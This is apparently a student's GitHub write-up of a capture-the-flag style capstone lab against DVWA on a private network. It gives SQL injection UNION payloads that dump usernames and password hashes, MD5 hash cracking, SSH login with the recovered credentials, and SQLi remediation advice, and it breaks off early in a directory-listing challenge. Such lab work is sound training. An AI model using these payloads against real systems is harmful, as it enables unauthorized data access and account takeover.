# Final-Capstone-Project
Final Capstone Activity from Challenge 1 - 4 using Kali VM, Internet access, crackstation
# Challenge 1: SQL Injection #
*In this part, you must discover user account information on a server and crack the password of Bob Smith's account. You will then locate the file that contains the Challenge 1 code and use Bob Smith's account credentials to open the file at 192.168.0.10 to view its contents.*

### Step 1: Preliminary setup <br>
a. Open a browser and go to the website at 10.5.5.12. <br>
Note: If you have problems reaching the website, remove the https:// prefix from the IP address in the browser address field. <br>

b. Login with the credentials admin / password. <br>

<img width="1366" height="702" alt="dvwa login page" src="https://github.com/user-attachments/assets/deafa907-a0ae-4d1b-b295-ed8e43eaaae7" />

c. Set the DVWA security level to low and click Submit. <br>

<img width="1366" height="702" alt="dvwa security level" src="https://github.com/user-attachments/assets/7639bfe8-f625-4bce-86ee-730bac6d3044" />

### Step 2: Retrieve the user credentials for the Bob Smith's account.
a. Identify the table that contains usernames and passwords. <br>
we do this by using the payload **1' OR 1=1 UNION SELECT 1,column_name FROM information_schema.columns WHERE table_name='users'#**
<img width="1366" height="702" alt="retrieve user names from column tables" src="https://github.com/user-attachments/assets/7f408f9c-6007-4a98-90b2-1ca7e4e05ca1" />

b. Locate a vulnerable input form that will allow you to inject SQL commands. <br>

**ID: 1' OR 1=1 UNION SELECT 1,column_name FROM information_schema.columns WHERE table_name='users'# <br>
First name: 1 <br>
Surname: user** <br>

**ID: 1' OR 1=1 UNION SELECT 1,column_name FROM information_schema.columns WHERE table_name='users'# <br>
First name: 1 <>br
Surname: password** <br>

c. Retrieve the username and the password hash for Bob Smith's account. <br>
 Use the payload **1' OR 1=1 UNION SELECT user, password FROM users #** to retrieve username and password hash for Bob Smith's account. <br>
 <img width="1366" height="702" alt="retrieve users credentials" src="https://github.com/user-attachments/assets/6104b8e2-c0e6-42c1-865b-674309238195" />

**ID: 1' OR 1=1 UNION SELECT user, password FROM users # <br>
First name: smithy <br>
Surname: 5f4dcc3b5aa765d61d8327deb882cf99** <br>

### Step 3: Crack Bob Smith's account password.
 *Use any password hash cracking tool desired to crack Bob Smith’s password.* <br>
I will be using **crackstation** to crack the hash by visiting **https://crackstation.net/** <br>
<img width="1366" height="702" alt="crackstation" src="https://github.com/user-attachments/assets/30382856-18db-4419-b916-478a16b744f4" />
i will then input the hash i got from Bob smith account which is **5f4dcc3b5aa765d61d8327deb882cf99**. Check the box **I'm not a robot captcha** and click-on **Crack Hashes** <br>

<img width="1366" height="702" alt="smithy hashes password" src="https://github.com/user-attachments/assets/eb325ca4-8a5c-42c3-bf0d-56aa04357a21" />
The hash result is **password**, type is **md5** <br>

### Step 4: Locate and open the file with Challenge 1 code.
a. Log into 192.168.0.10 as Bob Smith. <br>
I will primarily use Secure Shell (SSH) for secure command-line access to access files on **Kali Terminal Emulator** using its IP address (192.168.0.10), username (smithy), and password (password). <br>
**Command to use** <br>
ssh smithy@192.168.0.10, type yes, type password <br>

b. Locate and open the flag file in the user's home directory. <br>
type **ls** to list the files in the directory <br>
**my_passwords.txt** <br>
cat **my_passwords.txt** to view the content of the file <br>
**Congratulations! <br>
You found the flag for Challenge 1! <br>
The code for this challenge is 8748wf8J.** <br>

<img width="1366" height="702" alt="Screenshot_2026-01-16_19_17_51" src="https://github.com/user-attachments/assets/41b1eab9-920f-4c49-870f-19c03cc41d41" />

### Step 5: Research and propose SQL attack remediation.
What are five remediation methods for preventing SQL injection exploits?
a. Enforce the Principle of Least Privilege 
Limit the permissions of the database account used by the application. An application should only have access to the specific tables and operations (like SELECT or UPDATE) it needs for its function. It should never use a root or administrative account, which minimizes the damage an attacker can do even if they successfully bypass other defenses. <br>

b. Deploy a Web Application Firewall (WAF)
A WAF acts as an external shield that monitors and filters incoming HTTP traffic. Modern WAFs use signature-based detection and machine learning to identify and block common SQLi patterns before they even reach the application server. <br>

c.Use Parameterized Queries (Prepared Statements) 
This is considered the most effective primary defense. Developers use "placeholders" for user input instead of concatenating strings directly into a query. The database receives the query structure first and then binds the input as literal data, preventing it from ever being executed as code. <br>

d. Implement Allow-list Input Validation 
Instead of trying to block "bad" characters (blacklisting), this method only permits input that matches a strictly defined "good" pattern. For example, if a field requires a user ID, the system should only accept numeric digits and reject everything else, including quotes or semicolons. <br>

e.  Utilize Secure Stored Procedures
Stored procedures are pre-compiled SQL code stored directly on the database server. When implemented securely with parameters, they have the same protective effect as prepared statements by encapsulating query logic and separating it from user input. <br>

# Challenge 2: Web Server Vulnerabilities
*In this part, you must find vulnerabilities on an HTTP server. Misconfiguration of a web server can allow for the listing of files contained in directories on the server. You can use any of the tools you learned in earlier labs to perform reconnaissance to find the vulnerable directories.*
*In this challenge, you will locate the flag file in a vulnerable directory on a web server.*

### Step 1: Preliminary setup ###
If not already, log into the server at 10.5.5.12 with the admin / password credentials.
### Step 2: From the results of your reconnaissance, determine which directories are viewable using a web browser and URL manipulation. ###
Perform reconnaissance on the server to find directories where indexing was found.


